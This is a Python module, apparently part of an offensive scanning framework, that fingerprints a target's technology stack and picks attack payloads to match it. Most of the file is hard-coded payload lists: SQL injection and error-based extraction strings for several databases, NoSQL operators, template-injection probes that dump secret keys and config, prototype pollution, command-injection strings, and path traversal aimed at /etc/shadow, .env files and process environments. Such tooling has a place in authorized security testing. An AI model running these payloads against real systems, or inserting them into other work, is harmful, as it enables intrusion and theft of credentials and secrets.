"""
RedTeef — Environment-aware payload selection.

Uses fingerprint data from SneakyGits to select the most appropriate
payloads for the target's technology stack (DB, framework, OS).
"""

from __future__ import annotations

import logging
import re
from dataclasses import dataclass, field
from typing import Any, Dict, List, Optional, Set

from krumpa.core import Finding, ScanContext, Target

logger = logging.getLogger("krumpa.redteef.env_payloads")


# ------------------------------------------------------------------
# Technology → payload mapping
# ------------------------------------------------------------------

@dataclass
class EnvironmentProfile:
    """Detected technology stack for a target."""
    databases: Set[str] = field(default_factory=set)
    frameworks: Set[str] = field(default_factory=set)
    languages: Set[str] = field(default_factory=set)
    os_family: str = ""  # linux, windows, unknown
    web_server: str = ""  # nginx, apache, iis, etc.


# Fingerprint hints → technology mapping
_DB_HINTS: Dict[str, str] = {
    "mysql": "mysql", "mariadb": "mysql", "postgresql": "postgresql",
    "postgres": "postgresql", "mssql": "mssql", "sql server": "mssql",
    "oracle": "oracle", "sqlite": "sqlite", "mongodb": "mongodb",
    "redis": "redis", "elasticsearch": "elasticsearch",
    "couchdb": "couchdb", "cassandra": "cassandra",
}

_FRAMEWORK_HINTS: Dict[str, str] = {
    "django": "django", "flask": "flask", "fastapi": "fastapi",
    "express": "express", "rails": "rails", "laravel": "laravel",
    "spring": "spring", "asp.net": "aspnet", "next.js": "nextjs",
    "react": "react", "angular": "angular", "vue": "vue",
    "wordpress": "wordpress", "drupal": "drupal", "joomla": "joomla",
}

_LANGUAGE_HINTS: Dict[str, str] = {
    "python": "python", "php": "php", "java": "java", "ruby": "ruby",
    "node": "javascript", "javascript": "javascript", "go": "go",
    "rust": "rust", "c#": "csharp", ".net": "csharp",
}

_OS_HINTS: Dict[str, str] = {
    "linux": "linux", "ubuntu": "linux", "debian": "linux",
    "centos": "linux", "redhat": "linux", "unix": "linux",
    "windows": "windows", "iis": "windows", "asp.net": "windows",
    "darwin": "macos", "macos": "macos",
}

# ------------------------------------------------------------------
# DB-specific payloads
# ------------------------------------------------------------------

DB_SPECIFIC_PAYLOADS: Dict[str, Dict[str, List[str]]] = {
    "mysql": {
        "sqli": [
            "' OR 1=1-- -", "' UNION SELECT NULL,version()-- -",
            "' AND SLEEP(5)-- -", "' AND BENCHMARK(10000000,SHA1('test'))-- -",
        ],
        "error_extract": [
            "' AND extractvalue(1,concat(0x7e,version()))-- -",
            "' AND updatexml(1,concat(0x7e,version()),1)-- -",
        ],
    },
    "postgresql": {
        "sqli": [
            "' OR 1=1-- -", "' UNION SELECT NULL,version()-- -",
            "'; SELECT pg_sleep(5)-- -",
        ],
        "error_extract": [
            "' AND 1=CAST((SELECT version()) AS int)-- -",
        ],
    },
    "mssql": {
        "sqli": [
            "' OR 1=1-- -", "'; WAITFOR DELAY '00:00:05'-- -",
            "' UNION SELECT NULL,@@version-- -",
        ],
        "error_extract": [
            "' AND 1=CONVERT(int,@@version)-- -",
        ],
    },
    "oracle": {
        "sqli": [
            "' OR 1=1-- -",
            "' UNION SELECT NULL,banner FROM v$version-- -",
            "' OR 1=DBMS_PIPE.RECEIVE_MESSAGE('a',5)-- -",
        ],
    },
    "sqlite": {
        "sqli": [
            "' OR 1=1-- -", "' UNION SELECT NULL,sqlite_version()-- -",
        ],
    },
    "mongodb": {
        "nosql": [
            '{"$ne": ""}', '{"$gt": ""}', '{"$regex": ".*"}',
            '{"$where": "1==1"}',
        ],
    },
}

# Framework-specific payloads
FRAMEWORK_PAYLOADS: Dict[str, Dict[str, List[str]]] = {
    "django": {
        "ssti": ["{{7*7}}", "{% debug %}", "{{settings.SECRET_KEY}}"],
        "path_traversal": ["../settings.py", "../manage.py"],
    },
    "flask": {
        "ssti": ["{{7*7}}", "{{config}}", "{{config.SECRET_KEY}}"],
        "path_traversal": ["../app.py", "../config.py"],
    },
    "laravel": {
        "ssti": ["{{7*7}}", "@php echo 1; @endphp"],
        "path_traversal": ["../.env", "../storage/logs/laravel.log"],
    },
    "spring": {
        "ssti": ["${7*7}", "${T(java.lang.Runtime).getRuntime()}"],
        "path_traversal": ["../application.properties", "../application.yml"],
    },
    "express": {
        "prototype_pollution": ['{"__proto__":{"isAdmin":true}}'],
        "path_traversal": ["../.env", "../package.json"],
    },
}

# OS-specific payloads
OS_PAYLOADS: Dict[str, Dict[str, List[str]]] = {
    "linux": {
        "cmd_injection": ["; id", "| id", "$(id)", "`id`"],
        "path_traversal": ["../../../../etc/passwd", "../../../../etc/shadow"],
        "file_read": ["/etc/passwd", "/etc/hosts", "/proc/self/environ"],
    },
    "windows": {
        "cmd_injection": ["& dir", "| dir", "; dir /b"],
        "path_traversal": ["..\\..\\..\\windows\\win.ini", "..\\..\\..\\boot.ini"],
        "file_read": ["C:\\Windows\\win.ini", "C:\\Windows\\System32\\drivers\\etc\\hosts"],
    },
}


class EnvironmentPayloadSelector:
    """
    Analyze the target's technology stack and select optimized payloads.
    """

    def detect_environment(
        self, ctx: ScanContext, target: Target,
    ) -> EnvironmentProfile:
        """Build an environment profile from context metadata and target info."""
        profile = EnvironmentProfile()

        # Gather all text sources
        sources: List[str] = []
        sources.extend(str(v) for v in ctx.metadata.values())
        sources.extend(str(v) for v in target.metadata.values())
        sources.append(target.headers.get("Server", ""))
        sources.append(target.headers.get("X-Powered-By", ""))

        # Also check findings for technology info
        for f in ctx.findings:
            if "fingerprint" in f.tags or "recon" in f.tags:
                sources.append(f.description)
                sources.append(f.evidence)

        combined = " ".join(sources).lower()

        for hint, db in _DB_HINTS.items():
            if hint in combined:
                profile.databases.add(db)

        for hint, fw in _FRAMEWORK_HINTS.items():
            if hint in combined:
                profile.frameworks.add(fw)

        for hint, lang in _LANGUAGE_HINTS.items():
            if hint in combined:
                profile.languages.add(lang)

        for hint, os_name in _OS_HINTS.items():
            if hint in combined and not profile.os_family:
                profile.os_family = os_name

        server = target.headers.get("Server", "").lower()
        if server:
            profile.web_server = server.split("/")[0]
            if "iis" in server:
                profile.os_family = profile.os_family or "windows"
            elif "nginx" in server or "apache" in server:
                profile.os_family = profile.os_family or "linux"

        return profile

    def select_payloads(
        self,
        profile: EnvironmentProfile,
        vuln_type: str,
    ) -> List[str]:
        """
        Return optimized payloads for *vuln_type* based on the detected
        environment.

        *vuln_type*: sqli, nosql, ssti, cmd_injection, path_traversal, etc.
        """
        payloads: List[str] = []

        # DB-specific
        for db in profile.databases:
            db_payloads = DB_SPECIFIC_PAYLOADS.get(db, {})
            payloads.extend(db_payloads.get(vuln_type, []))

        # Framework-specific
        for fw in profile.frameworks:
            fw_payloads = FRAMEWORK_PAYLOADS.get(fw, {})
            payloads.extend(fw_payloads.get(vuln_type, []))

        # OS-specific
        if profile.os_family:
            os_payloads = OS_PAYLOADS.get(profile.os_family, {})
            payloads.extend(os_payloads.get(vuln_type, []))

        # Deduplicate while preserving order
        seen: set = set()
        unique: List[str] = []
        for p in payloads:
            if p not in seen:
                seen.add(p)
                unique.append(p)

        return unique

    def get_all_vuln_types(self) -> List[str]:
        """Return all supported vulnerability types."""
        types: Set[str] = set()
        for db_payloads in DB_SPECIFIC_PAYLOADS.values():
            types.update(db_payloads.keys())
        for fw_payloads in FRAMEWORK_PAYLOADS.values():
            types.update(fw_payloads.keys())
        for os_payloads in OS_PAYLOADS.values():
            types.update(os_payloads.keys())
        return sorted(types)
